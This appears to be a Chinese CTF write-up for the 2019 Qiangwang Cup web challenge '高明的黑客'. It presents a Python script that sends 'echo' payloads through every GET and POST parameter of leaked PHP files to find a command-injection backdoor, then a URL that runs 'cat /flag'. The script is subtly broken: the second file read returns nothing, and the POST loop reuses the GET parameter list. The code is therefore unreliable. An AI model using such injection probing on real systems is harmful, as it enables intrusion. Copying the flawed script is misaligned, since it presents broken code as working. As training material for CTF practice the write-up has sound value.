# 强网杯 2019

## Web

### 高明的黑客

通过页面提示

```html
我也是很佩服你们公司的开发，特地备份了网站源码到www.tar.gz以供大家观赏
```

可以通过访问 `http://c6a46daa-1ec6-4adc-ac66-258cd27b688c.node4.buuoj.cn:81/www.tar.gz` 获取到网站源码，可以看到有 3000 多个 PHP 文件，随便点进去可以发现十分的乱（悲），通过代码审计可以发现存在注入漏洞，通过编写 Python 收集一个页面中存在的所有 $\_GET 和 $\_POST 并传入一个带有特征的输出进行验证，最后就可以撞出来了（就是特别慢，慢死了） 。

```python
import re
import os
import requests

src_path = '../../phpstudy_pro/WWW/localhost/src'
file_list = os.listdir(src_path)

for file in file_list:
    f = open(src_path + '/' + file)
    GET_Array = re.findall('\$_GET\[\'(.*?)\'\]', f.read())
    POST_Array = re.findall('\$_POST\[\'(.*?)\'\]', f.read())

    f.close()
    for param in GET_Array:
        url = 'http://127.0.0.1/src/' + file
        res = requests.get(url, {
            param: 'echo K1sARa'
        })
        if 'K1sARa' in res.text:
            print(file, param, 'YES')
            exit(1)
        else:
            print(file, param, 'NO')

    for param in GET_Array:
        url = 'http://127.0.0.1/src/' + file
        res = requests.post(url, data={
            param: 'echo K1sARa'
        })
        if 'K1sARa' in res.text:
            print(file, param, 'YES')
            exit(1)
        else:
            print(file, param, 'NO')
```

运行以上代码后可以得到结果 `xk0SzyKwfzw.php Efa5BVG YES` ，通过访问

```url
http://c6a46daa-1ec6-4adc-ac66-258cd27b688c.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat /flag
```

就可以得到 flag 了。
